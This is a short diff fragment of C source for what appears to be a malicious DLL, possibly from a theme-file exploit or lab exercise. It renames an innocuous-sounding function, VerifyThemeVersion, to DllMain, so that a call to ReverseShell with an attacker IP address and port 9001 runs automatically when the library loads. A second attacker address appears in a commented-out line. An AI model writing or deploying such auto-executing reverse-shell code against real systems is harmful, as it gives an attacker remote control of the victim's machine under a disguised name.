@@ -62,7 +62,7 @@ static int ReverseShell(const char *CLIENT_IP, int CLIENT_PORT) {
         return (0);
 }
 
-void VerifyThemeVersion() {
+void DllMain() {
         ReverseShell("192.168.50.123", 9001);
 //        ReverseShell("10.10.14.20", 9001);
 }
